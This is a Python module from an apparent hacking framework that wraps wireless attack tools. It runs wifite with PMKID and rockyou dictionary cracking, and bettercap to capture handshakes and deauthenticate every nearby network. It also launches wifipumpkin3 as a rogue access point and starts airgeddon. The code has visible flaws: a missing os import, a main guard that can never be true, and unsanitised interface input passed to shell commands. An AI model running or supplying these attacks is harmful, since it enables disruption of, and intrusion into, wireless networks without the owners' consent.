import sys
import time
import subprocess
from src.core.banner import *
from src.core.bcolors import *

class wifi_hack(object):
    def __init__(self):
        pass
    rc = '/usr/share/wordlists/rockyou.txt.gz'
    if os.path.exists(rc):
        os.system('gunzip /usr/share/wordlists/rockyou.txt.gz')
    else:
        pass

    def wifi_auto_attack_wifite(self):
        print("\n")
        subprocess.Popen("ip addr", shell = True).wait()
        print(bcolors.BLUE + "\n~>[ " + bcolors.RED + "What wireless card would you like to use?" + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        iface = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC) 
        os.system('clear')
        process = os.system("wifite -i %s --ignore-locks --keep-ivs -p 1337 -mac --random-mac -v -inf --bully --pmkid --dic /usr/share/wordlists/rockyou.txt --require-fakeauth --nodeauth --pmkid-timeout 120" %(iface))
        return process

    def wifi_auto_attack_bettercap(self):
        while True:
            try:
                print("\n")
                subprocess.Popen("ip addr", shell = True).wait()
                print(bcolors.BLUE + "\n~>[ " + bcolors.RED + "What wireless card would you like to use? " + bcolors.BLUE + "{ex. wlan0" + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
                iface = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
                os.system('clear')
                subprocess.Popen('airmon-ng check kill; service NetworkManager restart; ip link set %s down; iw dev %s set type monitor; ip link set %s up; iw %s set txpower fixed 3737373737373; service NetworkManager start' %(iface, iface, iface, iface), shell = True).wait()
                process = subprocess.Popen('bettercap --iface %s -eval "set $ {bold}r0jahsm0ntar1 [Jesus.Loves.You] » {reset}; wifi.recon on; wifi.show; set wifi.show.sort clients desc; set ticker.commands clear; wifi.show; wifi.assoc all; wifi.assoc all wifi.handshakes.file /usr/local/opt/handshakes; wifi.deauth all"' %(iface), shell = True).wait()
                return process
            except:
                neo.attack_wifi()
                break

    def wifi_auto_attack_wifipumpkin3(self):
        print("\n")
        subprocess.Popen("ip addr", shell = True).wait()
        print(bcolors.BLUE + "\n~>[ " + bcolors.RED + "What wireless card would you like to use?" + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        iface = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
        print(bcolors.BLUE + "\n~>[ " + bcolors.RED + "What wifi name would you like to use?" + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        name = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        process = os.system("wifipumpkin3 --xpulp 'set interface %s; set ssid %s; set proxy noproxy; start'" %(iface, name))
        return process

    def wifi_attack_airgeddon(self):
        os.system('clear')
        process = subprocess.Popen("airgeddon", shell = True).wait()
        return process

    def wifi_attack_wifipumpkin3(self):
        os.system('clear')
        process = os.system("wifipumpkin3")
        return process

wifi_killer = wifi_hack()

if ' __name__' == '__main__':
        sys.exit(wifi_killer())
